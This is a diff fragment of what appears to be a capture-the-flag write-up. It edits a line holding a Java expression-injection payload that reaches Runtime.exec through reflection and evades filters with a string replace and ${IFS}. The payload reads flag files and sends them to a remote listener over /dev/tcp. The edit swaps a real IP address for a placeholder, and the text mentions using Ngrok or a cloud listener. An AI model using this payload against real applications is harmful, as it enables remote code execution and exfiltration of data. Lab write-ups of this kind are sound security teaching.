@@ -192,7 +192,7 @@ However, it still returns the object instance and not the actual value we need, 
 
 To listen on public IP we can either use Ngrok or any cloud instance reachable from internet, and here I have used GCE listening on port 1337.
 
-Our final payload is `"".getClass().forName("jawa.lang.Runtime".replace("w","v")).getRuntime().exec("bash -c cat${IFS}/flag*>&/dev/tcp/35.184.189.108/1337<&1")`
+Our final payload is `"".getClass().forName("jawa.lang.Runtime".replace("w","v")).getRuntime().exec("bash -c cat${IFS}/flag*>&/dev/tcp/<IP>/1337<&1")`
 
 <img src="../image/htb.gif" alt="script" width="500"/>
 
